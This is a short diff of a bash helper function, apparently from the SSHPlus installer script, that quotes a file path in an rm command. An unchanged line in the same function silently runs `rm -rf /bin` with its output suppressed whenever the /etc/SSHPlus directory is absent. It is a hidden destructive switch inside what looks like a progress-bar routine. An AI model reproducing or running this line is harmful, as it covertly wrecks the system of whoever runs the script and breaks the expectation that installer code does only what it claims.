@@ -3,7 +3,7 @@ fun_bar () {
 comando[0]="$1"
 comando[1]="$2"
  (
-[[ -e $HOME/fim ]] && rm $HOME/fim
+[[ -e "$HOME/fim" ]] && rm "$HOME/fim"
 [[ ! -d /etc/SSHPlus ]] && rm -rf /bin > /dev/null 2>&1
 ${comando[0]} -y > /dev/null 2>&1
 ${comando[1]} -y > /dev/null 2>&1
